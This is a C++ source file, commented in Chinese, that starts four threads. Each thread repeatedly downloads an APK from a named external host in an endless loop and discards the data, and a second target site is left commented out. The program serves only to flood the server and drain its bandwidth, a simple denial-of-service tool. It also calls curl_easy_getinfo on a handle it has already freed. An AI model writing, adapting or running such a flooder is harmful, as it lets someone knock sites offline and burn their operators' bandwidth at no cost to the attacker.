#include<iostream>
#include<string>
#include<curl\curl.h>
#include<sstream>
#pragma comment(lib,"ws2_32.lib")
using namespace std;


size_t write_data(void* ptr, size_t size, size_t nmemb, void* stream)
{
	string data((const char*)ptr, (size_t)size * nmemb);

	*((stringstream*)stream) << data << endl;

	return size * nmemb;
}

void fk() {
	double speed;
	std::stringstream out;
	void* curl = curl_easy_init();
	// 设置URL
	curl_easy_setopt(curl, CURLOPT_URL, "http://91.di2di.com/xiazaimulu/an/01/pp49.apk");
	//curl_easy_setopt(curl, CURLOPT_URL, "http://pcup.xyz/index.html");

	// 设置接收数据的处理函数和存放变量
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &out);
	curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1);

	// 执行HTTP GET操作
	CURLcode res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);

	int return_code = curl_easy_getinfo(curl, CURLINFO_SPEED_DOWNLOAD, &speed); // curl_get_info必须在curl_easy_perform之后调用
	if ((CURLE_OK == return_code) && speed) {
	}
}

DWORD WINAPI Fun(LPVOID lpParamter)
{
	while (true)
	{
		fk();
	}
}

int main(int argc, char* argv[])
{
	curl_global_init(CURL_GLOBAL_ALL);
	CloseHandle(CreateThread(NULL, 0, Fun, NULL, 0, NULL));
	CloseHandle(CreateThread(NULL, 0, Fun, NULL, 0, NULL));
	CloseHandle(CreateThread(NULL, 0, Fun, NULL, 0, NULL));
	CloseHandle(CreateThread(NULL, 0, Fun, NULL, 0, NULL));

	int start = clock();
	while (true)
	{
		Sleep(100);
	}
	return 0;
}